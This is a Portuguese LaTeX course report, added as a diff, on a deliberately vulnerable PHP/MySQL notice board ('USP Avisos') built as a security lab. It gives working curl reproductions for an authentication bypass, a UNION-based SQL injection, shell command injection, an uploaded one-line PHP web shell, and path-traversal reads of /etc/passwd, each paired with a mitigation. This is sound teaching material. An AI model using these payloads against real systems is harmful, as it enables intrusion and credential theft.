@@ -1,0 +1,487 @@
+\begin{abstract}
+Este documento descreve a primeira parte do projeto de Engenharia de Segurança: um ambiente
+containerizado com servidor web Apache, interpretador PHP 5.6.40 e banco MySQL 5.7, hospedando
+um mural interno de avisos fictício (\textit{USP Avisos}: login, publicação, busca e recursos
+auxiliares) com falhas intencionais. O objetivo é permitir
+a demonstração de vulnerabilidades de aplicação web, incluindo intrusão pelo próprio site em PHP,
+conforme o enunciado da disciplina \cite{enunciado}. O ambiente é exclusivamente educativo e não
+deve ser publicado ou operado em produção.
+\end{abstract}
+\section{Introdução}
+
+\subsection{Contexto e motivação}
+
+A segurança de aplicações web depende de controles em várias camadas: autenticação, validação de
+entrada, separação de privilégios no banco de dados e configuração do servidor. Falhas em qualquer
+uma dessas camadas podem permitir que um atacante leia dados confidenciais, altere informações ou
+execute código no servidor --- comprometendo a confidencialidade, a integridade e a disponibilidade
+do sistema (tríade CIA).
+
+O enunciado da disciplina solicita, na primeira parte, um provedor web com um site em PHP~5 que
+contenha \emph{diversas vulnerabilidades exploráveis} e que permita \emph{intrusão pelo site}.
+A entrega inclui configurações do Apache e do MySQL, os principais arquivos do site, um relatório
+das vulnerabilidades e, quando possível, compartilhamento do ambiente via máquina virtual ou Docker.
+
+\subsection{O aplicativo \textit{USP Avisos}}
+\label{sec:usp-avisos}
+
+O \textbf{USP Avisos} é o nome fictício do \emph{site} entregue nesta Parte~1: um mural eletrônico
+de uso interno, no estilo de um quadro de avisos de unidade universitária (comunicados, lembretes e
+informativos para servidores e estudantes). O cenário evoca o contexto da USP apenas como \emph{história
+de laboratório}; não há vínculo com sistemas oficiais da universidade, nem o aplicativo deve ser
+implantado fora do ambiente local do grupo.
+
+Do ponto de vista pedagógico, o USP Avisos representa uma aplicação web pequena e legada --- PHP~5.6
+com páginas procedurais e MySQL --- ainda comum em intranets antigas. Ele precisa ser \textbf{funcional
+no fluxo honesto} (login, leitura e publicação de avisos) para que a banca possa contrastar o uso
+normal com a exploração das falhas. As vulnerabilidades não são ``bugs acidentais'': foram plantadas
+de propósito em rotinas que parecem recursos legítimos (busca, anexo, modelo de texto, teste de rede).
+
+\textbf{Capacidades do sistema (uso legítimo).} Após autenticação por e-mail e senha, o usuário
+acessa um menu com as seguintes funções, implementadas em PHP sob o diretório \texttt{site/}:
+
+\begin{itemize}
+    \item \textbf{Avisos} (\texttt{avisos.php}): lista os comunicados publicados, com autor e data;
+          permite buscar avisos pelo título.
+    \item \textbf{Publicar} (\texttt{publicar.php}): cadastra um novo aviso (título e corpo), associado
+          ao usuário da sessão.
+    \item \textbf{Impressora} (\texttt{impressora.php}): formulário de ``teste de alcance'' que envia
+          um endereço de rede para verificação (recurso administrativo fictício do laboratório).
+    \item \textbf{Modelos} (\texttt{modelo.php}): exibe modelos pré-definidos de texto para avisos
+          (\texttt{site/modelos/}).
+    \item \textbf{Anexos} (\texttt{anexo.php}): envio de arquivos para o diretório \texttt{site/anexos/}.
+    \item \textbf{Meu usuário} (\texttt{usuario.php}): exibe dados básicos da conta autenticada;
+          \textbf{Sair} (\texttt{sair.php}) encerra a sessão.
+\end{itemize}
+
+\textbf{Dados persistentes.} O MySQL armazena duas entidades principais: \texttt{usuarios} (nome,
+e-mail, hash de senha) e \texttt{avisos} (título, corpo, autor e carimbo de tempo), conforme
+\texttt{sql/init.sql}. Usuários de demonstração (Ivan, Daniel e Pedro, domínio fictício
+\texttt{@avisos.br}) são criados na subida do container por \texttt{site/bin/criar-usuarios.php}.
+
+\textbf{Papel no relatório.} Nas seções seguintes, ``o site'' ou ``o mural'' referem-se sempre a este
+aplicativo USP Avisos: a arquitetura Docker o hospeda; as falhas intencionais estão mapeadas às
+páginas acima; e o script \texttt{tests/fluxo.sh} valida o \emph{fluxo feliz} (login, publicação e
+listagem) antes das demonstrações de ataque.
+
+\subsection{Escopo e limites}
+
+Este relatório cobre somente a Parte~1. Não fazem parte desta entrega: honeypot, varredura de rede
+como componente do ambiente, IPsec, proxy interceptador, Snort, segunda máquina virtual, rsync e
+crontab (previstos para alavancagem na Parte~2). O relatório registra, na Seção~\ref{sec:portas},
+quais portas o host publica.
+
+\subsection{Aviso legal e ético}
+
+Todas as falhas descritas foram introduzidas de forma deliberada para fins acadêmicos. A exploração
+deve restringir-se ao ambiente local do grupo (\texttt{localhost:8080}). O uso das técnicas aqui
+documentadas contra sistemas de terceiros sem autorização é ilegal e antiético.
+
+\section{Objetivos}
+
+\begin{itemize}
+    \item Disponibilizar um ambiente reproduzível (Docker Compose) com PHP~5.6.40 e MySQL~5.7.
+    \item Implementar um mural interno funcional (login, avisos, publicação, recursos auxiliares).
+    \item Incorporar falhas representativas de falhas de autenticação, injeção SQL, injeção de
+          comando, upload inseguro e inclusão de arquivo local (LFI).
+    \item Documentar vetores de ataque, impactos e medidas de mitigação hipotéticas.
+    \item Preparar base técnica para a Parte~2 (ganho de privilégio e alavancagem entre máquinas).
+\end{itemize}
+
+\section{Arquitetura do ambiente}
+
+\subsection{Visão geral}
+
+O ambiente é composto por dois serviços na rede padrão do Docker Compose \cite{dockerCompose}:
+
+\begin{itemize}
+    \item \textbf{web}: imagem construída a partir de \texttt{php:5.6.40-apache}; publica a porta
+          \texttt{8080} do host na porta \texttt{80} do container; monta \texttt{site/} como
+          \texttt{DocumentRoot} (\texttt{/var/www/html}).
+    \item \textbf{db}: imagem \texttt{mysql:5.7} com \texttt{platform: linux/amd64}; não publica
+          porta no host; o PHP conecta pelo hostname \texttt{db}.
+\end{itemize}
+
+A URL de acesso é \url{http://localhost:8080}. Credenciais da aplicação: banco \texttt{app},
+usuário \texttt{app}, senha \texttt{app}. Senha do root do MySQL no container: \texttt{laboratorio}
+(uso administrativo interno).
+
+\subsection{Fronteira de confiança}
+
+Do ponto de vista de engenharia de segurança, a fronteira externa é a porta \texttt{8080} do host:
+qualquer processo na máquina do usuário (ou na rede, se a porta estiver exposta) pode enviar
+requisições HTTP ao mural. Após autenticação (legítima ou abusada), o atacante passa a interagir
+com páginas autenticadas, incluindo as que executam comandos ou gravam arquivos no servidor.
+
+O container \texttt{web} executa o PHP como usuário do Apache (\texttt{www-data}). Esse usuário
+não é administrador do sistema, mas ainda possui permissão de leitura de grande parte do sistema
+de arquivos do container e de escrita em diretórios montados (por exemplo, \texttt{site/anexos/}).
+
+\subsection{Configuração do Apache}
+
+O virtual host está em \texttt{apache/000-default.conf}. Destaques de segurança:
+
+\begin{itemize}
+    \item \texttt{Options -Indexes}: impede listagem automática de diretórios sem índice.
+    \item \texttt{DocumentRoot} apontando para \texttt{/var/www/html}.
+    \item Logs de erro e de acesso no padrão do Apache.
+\end{itemize}
+
+\subsection{Configuração do MySQL}
+
+O arquivo \texttt{mysql/my.cnf} define \texttt{utf8mb4}, collation \texttt{utf8mb4\_unicode\_ci} e
+\texttt{bind-address = 0.0.0.0} \emph{dentro} do container, para que o serviço \texttt{web} alcance o
+banco pela rede interna do Compose. A ausência de mapeamento \texttt{ports:} no serviço \texttt{db}
+evita expor a porta 3306 no host.
+
+\subsection{Inicialização do banco e usuários}
+
+O script \texttt{sql/init.sql} cria as tabelas \texttt{usuarios} e \texttt{avisos}. Os usuários de
+demonstração (Ivan, Daniel e Pedro) são inseridos na subida por \texttt{site/bin/criar-usuarios.php},
+com hashes gerados por \texttt{password\_hash} no PHP~5.6.
+
+\section{Funcionamento do sistema}\label{sec:func}
+
+Após login, o usuário autenticado pode:
+
+\begin{itemize}
+    \item listar e buscar avisos (\texttt{avisos.php});
+    \item publicar avisos (\texttt{publicar.php});
+    \item testar alcance de ``servidor de impressora'' (\texttt{impressora.php});
+    \item visualizar modelos de aviso (\texttt{modelo.php});
+    \item enviar anexos (\texttt{anexo.php});
+    \item consultar perfil (\texttt{usuario.php}) e encerrar sessão (\texttt{sair.php}).
+\end{itemize}
+
+Credenciais de demonstração (senha \texttt{aviso123} para ambos):
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Nome & E-mail \\
+\midrule
+Ivan & \texttt{ivan@avisos.br} \\
+Daniel & \texttt{daniel@avisos.br} \\
+Pedro & \texttt{pedro@avisos.br} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+Os endereços \texttt{@avisos.br} são fictícios para o laboratório (não são caixas reais). A
+prática de evitar domínios operacionais em documentação e testes é recomendada pela IETF
+\cite{rfc2606}; o RFC~2606 reserva, entre outros, o TLD \texttt{.example} para exemplos.
+
+\section{Superfície de exposição e portas}\label{sec:portas}
+
+No host, a única porta publicada intencionalmente é \textbf{8080}, encaminhada à porta 80 do Apache.
+O tráfego é HTTP em claro (sem TLS nesta entrega didática).
+
+O MySQL escuta na rede interna do Compose (3306/tcp no container), sem publicação no host. Ferramentas
+de varredura executadas \emph{no host} contra \texttt{localhost} encontrarão primariamente a 8080;
+isso é coerente com o modelo de ``único ponto de entrada'' para o mural.
+
+\section{Catálogo de vulnerabilidades}
+
+A Tabela~\ref{tab:resumo} resume as falhas. Nas subseções seguintes, cada item é analisado com
+vetor, pré-condições, reprodução, impacto na tríade CIA, classificação segundo OWASP Top 10
+\cite{owasp2021} e CWE \cite{cwe} e mitigação hipotética.
+
+\begin{table}[h]
+\centering
+\caption{Resumo das vulnerabilidades intencionais}
+\label{tab:resumo}
+\begin{tabular}{@{}p{3.2cm}p{3.5cm}p{4.5cm}p{2.8cm}@{}}
+\toprule
+\textbf{Falha} & \textbf{Arquivo(s)} & \textbf{Impacto principal} & \textbf{Demo} \\
+\midrule
+Autenticação fraca & \texttt{login.php}, \texttt{auth.php} & Personificação de usuário do mural & Relatório \\
+Injeção SQL & \texttt{avisos.php} & Exfiltração via banco & Ao vivo \\
+Injeção de comando & \texttt{impressora.php} & RCE como \texttt{www-data} & Relatório/terminal \\
+Upload executável & \texttt{anexo.php}, \texttt{anexos/} & RCE persistente & Relatório/terminal \\
+LFI & \texttt{modelo.php} & Leitura (e possível execução) de arquivos & Relatório/terminal \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsection{Autenticação fraca (quebra de autenticação)}
+
+\textbf{Descrição.} O fluxo correto de autenticação valida e-mail e senha com
+\texttt{password\_verify} em \texttt{entrar()}. Porém, \texttt{login.php} aceita também
+\texttt{definir\_sessao\_por\_email()}, que associa a sessão ao usuário encontrado pelo e-mail
+sem verificar a senha, desde que o campo senha não esteja vazio.
+
+\textbf{Classificação.} OWASP Top 10:2021 --- A07:2021 \emph{Identification and Authentication Failures}
+\cite{owasp2021}; CWE-287 \emph{Improper Authentication} \cite{cwe287}.
+
+\textbf{Pré-condições.} Conhecimento do e-mail de um usuário cadastrado; acesso à página de login.
+
+\textbf{Reprodução (navegador).} Informar \texttt{daniel@avisos.br} e senha arbitrária não
+vazia; acessar \texttt{usuario.php} e observar identidade de Daniel.
+
+\textbf{Reprodução (terminal).}
+\begin{lstlisting}
+jar=$(mktemp)
+curl -s -c "$jar" -b "$jar" -o /dev/null \
+  -d 'email=daniel@avisos.br&senha=qualquer' \
+  http://localhost:8080/login.php
+curl -s -c "$jar" -b "$jar" http://localhost:8080/usuario.php | grep 'Daniel'
+rm -f "$jar"
+\end{lstlisting}
+
+\textbf{Impacto.}
+\begin{itemize}
+    \item \textbf{Confidencialidade:} acesso a páginas autenticadas como outro usuário.
+    \item \textbf{Integridade:} publicação de avisos em nome de terceiros.
+    \item \textbf{Disponibilidade:} indireta (conteúdo falso ou abusivo).
+\end{itemize}
+
+\textbf{Mitigação hipotética.} Remover o atalho de sessão por e-mail; exigir sempre
+\texttt{password\_verify}; implementar MFA em ambientes reais; registrar tentativas falhas e
+aplicar rate limiting.
+
+\subsection{Injeção SQL na busca de avisos}
+
+\textbf{Descrição.} Quando o parâmetro \texttt{q} não é vazio, \texttt{buscar\_titulo\_montado()}
+concatena a entrada na cláusula \texttt{LIKE}. A listagem sem busca usa consulta preparada e não
+apresenta o defeito --- ilustrando inconsistência de controles no mesmo módulo.
+
+\textbf{Classificação.} OWASP Top 10:2021 --- A03:2021 \emph{Injection} \cite{owasp2021,owaspSql};
+CWE-89 \emph{SQL Injection} \cite{cwe89}.
+
+\textbf{Pré-condições.} Sessão autenticada (conta legítima ou obtida via falha de autenticação).
+
+\textbf{Payload de demonstração.}
+\begin{lstlisting}
+x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#
+\end{lstlisting}
+
+O apóstrofo encerra a string do \texttt{LIKE}; \texttt{UNION SELECT} projeta colunas compatíveis com
+a renderização da página; \texttt{\#} comenta o restante da consulta original.
+
+\textbf{Reprodução (terminal).}
+\begin{lstlisting}
+jar=$(mktemp)
+curl -s -c "$jar" -b "$jar" -o /dev/null \
+  -d 'email=ivan@avisos.br&senha=aviso123' \
+  http://localhost:8080/login.php
+curl -s -c "$jar" -b "$jar" -G --data-urlencode \
+  "q=x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#" \
+  http://localhost:8080/avisos.php | grep -o 'daniel@avisos.br'
+rm -f "$jar"
+\end{lstlisting}
+
+\textbf{Impacto.} Exfiltração de e-mails e hashes de senha da tabela \texttt{usuarios}; em cenários
+mais permissivos no banco, potencial \texttt{UPDATE}/\texttt{DELETE}. A confidencialidade dos dados
+da aplicação é comprometida.
+
+\textbf{Mitigação hipotética.} Consultas parametrizadas em todos os caminhos \cite{phpPrepared,owaspSql};
+ORM com binding seguro; princípio do menor privígio no usuário MySQL; monitoramento de consultas
+anômalas.
+
+\subsection{Injeção de comando no teste de impressora}
+
+\textbf{Descrição.} \texttt{impressora.php} executa
+\texttt{shell\_exec('ping -c 2 ' . \$host)}. Metacaracteres do shell (\texttt{;}, \texttt{\&\&},
+\texttt{|}) permitem encadear comandos arbitrários.
+
+\textbf{Classificação.} OWASP Top 10:2021 --- A03:2021 \emph{Injection} \cite{owasp2021};
+CWE-78 \emph{OS Command Injection} \cite{cwe78}.
+
+\textbf{Exemplo de entrada.} \texttt{127.0.0.1; id}
+
+\textbf{Reprodução (terminal).}
+\begin{lstlisting}
+jar=$(mktemp)
+curl -s -c "$jar" -b "$jar" -o /dev/null \
+  -d 'email=ivan@avisos.br&senha=aviso123' \
+  http://localhost:8080/login.php
+curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' \
+  http://localhost:8080/impressora.php | grep www-data
+rm -f "$jar"
+\end{lstlisting}
+
+\textbf{Impacto.} Execução de código no servidor web como \texttt{www-data}: leitura de arquivos,
+modificação de conteúdo web gravável, possível pivotagem na rede Docker. Atende ao requisito de
+\textbf{intrusão pelo site em PHP~5}: o atacante deixa de ser apenas cliente HTTP e passa a
+influenciar o sistema operacional do container.
+
+\textbf{Mitigação hipotética.} Eliminar chamadas ao shell; validar entradas com lista branca; usar APIs
+nativas; \texttt{disable\_functions} para \texttt{shell\_exec}, \texttt{system}, etc., quando aplicável.
+
+\subsection{Upload de arquivo executável (web shell)}
+
+\textbf{Descrição.} \texttt{anexo.php} grava uploads em \texttt{site/anexos/} preservando o nome
+original, sem validação de tipo ou extensão. O Apache interpreta arquivos \texttt{.php} nesse
+diretório.
+
+\textbf{Classificação.} OWASP Top 10:2021 --- A04:2021 \emph{Insecure Design} e A05:2021
+\emph{Security Misconfiguration} \cite{owasp2021,owaspUpload}; CWE-434 \emph{Unrestricted Upload of
+File with Dangerous Type} \cite{cwe434}.
+
+\textbf{Reprodução (terminal).}
+\begin{lstlisting}
+echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/cmd.php
+jar=$(mktemp)
+curl -s -c "$jar" -b "$jar" -o /dev/null \
+  -d 'email=ivan@avisos.br&senha=aviso123' \
+  http://localhost:8080/login.php
+curl -s -c "$jar" -b "$jar" -F 'arquivo=@/tmp/cmd.php' \
+  http://localhost:8080/anexo.php
+curl -s 'http://localhost:8080/anexos/cmd.php?c=whoami'
+rm -f "$jar" /tmp/cmd.php
+\end{lstlisting}
+
+\textbf{Impacto.} \textbf{Persistência}: o atacante mantém um ponto de execução remota reutilizável
+(backdoor em PHP), com efeito semelhante à injeção de comando, porém mais estável para reentrada.
+
+\textbf{Mitigação hipotética.} Armazenar uploads fora do \texttt{DocumentRoot}; servir apenas como
+download; renomear arquivos; validar MIME e extensão; impedir interpretação PHP na pasta de uploads.
+
+\subsection{Inclusão de arquivo local (LFI)}
+
+\textbf{Descrição.} \texttt{modelo.php} inclui arquivos a partir de
+\texttt{site/modelos/ . \$modelo}, permitindo sequências \texttt{../} e wrappers \texttt{php://}.
+
+\textbf{Classificação.} OWASP Top 10:2021 --- A03:2021 \emph{Injection} \cite{owasp2021};
+CWE-22 \emph{Path Traversal} e CWE-829 \emph{Inclusion of Functionality from Untrusted Control
+Sphere} \cite{cwe22,cwe829}.
+
+\textbf{Exemplos de URL.}
+\begin{itemize}
+    \item \url{http://localhost:8080/modelo.php?modelo=../../../../etc/passwd}
+    \item \url{http://localhost:8080/modelo.php?modelo=php://filter/convert.base64-encode/resource=/etc/passwd}
+\end{itemize}
+
+\textbf{Reprodução (terminal).}
+\begin{lstlisting}
+jar=$(mktemp)
+curl -s -c "$jar" -b "$jar" -o /dev/null \
+  -d 'email=ivan@avisos.br&senha=aviso123' \
+  http://localhost:8080/login.php
+curl -s -c "$jar" -b "$jar" \
+  'http://localhost:8080/modelo.php?modelo=../../../../etc/passwd' \
+  | grep -o 'root:.*'
+rm -f "$jar"
+\end{lstlisting}
+
+\textbf{Impacto.} Leitura de arquivos sensíveis do sistema (\texttt{/etc/passwd}, configurações).
+Se o alvo incluído for código PHP, pode haver execução. Suporta reconhecimento interno útil à
+Parte~2 (identificação de serviços e caminhos no servidor).
+
+\textbf{Mitigação hipotética.} Mapeamento fixo de modelos permitidos; rejeitar \texttt{..} e
+wrappers; \texttt{basename()}; nunca passar entrada do usuário diretamente a \texttt{include}.
+
+
+\section{Procedimento de implantação}
+
+O passo a passo completo de instalação (Docker Desktop, primeira subida, parada do ambiente,
+recriação do banco com \texttt{docker compose down -v}, credenciais de demonstração e roteiro para
+a banca) está no arquivo \texttt{README.md} na raiz do repositório entregue. Este relatório resume
+apenas o essencial para reproduzir o ambiente.
+
+Na pasta do projeto:
+\begin{lstlisting}
+docker compose up -d --build
+\end{lstlisting}
+
+Verificação rápida: \url{http://localhost:8080/login.php} (HTTP 200); \texttt{docker compose exec web php -v}
+deve reportar PHP 5.6.40. O script \texttt{tests/fluxo.sh} valida login, publicação e listagem (a
+explicação do script também consta do \texttt{README.md}).
+
+Em Apple Silicon, a primeira subida do MySQL~5.7 emulado (\texttt{linux/amd64}) pode levar vários
+minutos (detalhes e dicas de diagnóstico no \texttt{README.md}).
+
+\section{Conclusão e continuidade (Parte~2)}
+
+O ambiente entregue atende ao escopo da Parte~1: stack documentada (Apache, MySQL, PHP~5.6), mural
+funcional e conjunto de falhas que cobrem autenticação, injeção em banco, execução remota e leitura
+de arquivos. As falhas de execução estabelecem \emph{footprint} no container \texttt{web} como
+\texttt{www-data}, ponto de partida natural para a Parte~2 (comunicação com outra máquina, rsync,
+crontab e alavancagem de privilégio), sem implementá-las neste relatório.
+
+\section{Referências}
+
+As referências seguem o formato numérico da IEEE \cite{ieeeStyle}. Foram escolhidas fontes
+primárias ou amplamente aceitas na comunidade de segurança de software: taxonomia OWASP para
+riscos em aplicações web, entradas CWE alinhadas a cada falha implementada, RFC da IETF para
+nomes DNS de documentação, documentação oficial de PHP e Docker para a stack do laboratório, e o
+enunciado do projeto como requisito acadêmico. URLs foram verificadas em setembro de 2026; o OWASP
+Top 10:2021 permanece referência estável para classificação (edição 2025 disponível no mesmo
+portal \cite{owaspPortal}).
+
+\begin{thebibliography}{99}
+
+\bibitem{ieeeStyle}
+IEEE, ``IEEE Reference Guide,'' IEEE Author Center. [Online]. Available:
+\url{https://journals.ieeeauthorcenter.ieee.org/wp-content/uploads/IEEE-Reference-Guide.pdf}.
+Accessed: Sep. 30, 2026.
+
+\bibitem{enunciado}
+Material didático da disciplina de Engenharia de Segurança, ``Enunciado do Projeto --- Partes 1 e
+2,'' documento interno, 2026, unpublished.
+
+\bibitem{owasp2021}
+OWASP Foundation, ``OWASP Top 10:2021,'' OWASP, 2021. [Online]. Available:
+\url{https://owasp.org/Top10/}. Accessed: Sep. 30, 2026.
+
+\bibitem{owaspPortal}
+OWASP Foundation, ``OWASP Top 10 Project,'' OWASP. [Online]. Available:
+\url{https://owasp.org/www-project-top-ten/}. Accessed: Sep. 30, 2026.
+
+\bibitem{owaspSql}
+OWASP Foundation, ``SQL Injection Prevention Cheat Sheet,'' OWASP Cheat Sheet Series. [Online].
+Available: \url{https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html}.
+Accessed: Sep. 30, 2026.
+
+\bibitem{owaspUpload}
+OWASP Foundation, ``File Upload Cheat Sheet,'' OWASP Cheat Sheet Series. [Online]. Available:
+\url{https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html}. Accessed:
+Sep. 30, 2026.
+
+\bibitem{cwe}
+MITRE Corporation, ``Common Weakness Enumeration (CWE),'' Version 4.17, MITRE. [Online].
+Available: \url{https://cwe.mitre.org/}. Accessed: Sep. 30, 2026.
+
+\bibitem{cwe287}
+MITRE Corporation, ``CWE-287: Improper Authentication,'' MITRE. [Online]. Available:
+\url{https://cwe.mitre.org/data/definitions/287.html}. Accessed: Sep. 30, 2026.
+
+\bibitem{cwe89}
+MITRE Corporation, ``CWE-89: Improper Neutralization of Special Elements used in an SQL
+Command ('SQL Injection'),'' MITRE. [Online]. Available:
+\url{https://cwe.mitre.org/data/definitions/89.html}. Accessed: Sep. 30, 2026.
+
+\bibitem{cwe78}
+MITRE Corporation, ``CWE-78: Improper Neutralization of Special Elements used in an OS Command
+('OS Command Injection'),'' MITRE. [Online]. Available:
+\url{https://cwe.mitre.org/data/definitions/78.html}. Accessed: Sep. 30, 2026.
+
+\bibitem{cwe434}
+MITRE Corporation, ``CWE-434: Unrestricted Upload of File with Dangerous Type,'' MITRE.
+[Online]. Available: \url{https://cwe.mitre.org/data/definitions/434.html}. Accessed: Sep. 30,
+2026.
+
+\bibitem{cwe22}
+MITRE Corporation, ``CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path
+Traversal'),'' MITRE. [Online]. Available:
+\url{https://cwe.mitre.org/data/definitions/22.html}. Accessed: Sep. 30, 2026.
+
+\bibitem{cwe829}
+MITRE Corporation, ``CWE-829: Inclusion of Functionality from Untrusted Control Sphere,'' MITRE.
+[Online]. Available: \url{https://cwe.mitre.org/data/definitions/829.html}. Accessed: Sep. 30,
+2026.
+
+\bibitem{rfc2606}
+D. Eastlake and A. Panitz, ``Reserved Top Level DNS Names,'' RFC 2606, BCP 32, IETF, Jun. 1999.
+[Online]. Available: \url{https://www.rfc-editor.org/rfc/rfc2606.html}. Accessed: Sep. 30, 2026.
+
+\bibitem{phpPrepared}
+The PHP Group, ``Prepared Statements --- Mysqli quickstart,'' PHP Manual. [Online]. Available:
+\url{https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php}. Accessed: Sep. 30,
+2026.
+
+\bibitem{dockerCompose}
+Docker Inc., ``Docker Compose Overview,'' Docker Documentation. [Online]. Available:
+\url{https://docs.docker.com/compose/}. Accessed: Sep. 30, 2026.
+
+\end{thebibliography}
